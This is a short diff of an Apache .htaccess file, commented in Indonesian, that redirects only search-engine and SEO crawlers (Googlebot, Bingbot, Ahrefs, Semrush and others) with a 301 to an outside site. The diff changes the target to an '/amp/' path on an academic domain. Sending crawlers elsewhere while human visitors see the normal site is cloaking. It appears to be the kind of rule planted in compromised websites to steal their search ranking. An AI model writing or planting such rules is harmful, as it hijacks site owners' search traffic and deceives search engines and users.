@@ -4,6 +4,6 @@ RewriteEngine On
 # Deteksi User-Agent bot
 RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
 
-# Redirect 301 hanya untuk bot ke https://citizen-science-1ocean.zooreach.org/
-RewriteRule ^(.*)$ https://citizen-science-1ocean.zooreach.org/ [R=301,L]
+# Redirect 301 hanya untuk bot ke https://stajember.ac.id/amp/
+RewriteRule ^(.*)$ https://stajember.ac.id/amp/ [R=301,L]
 </IfModule>
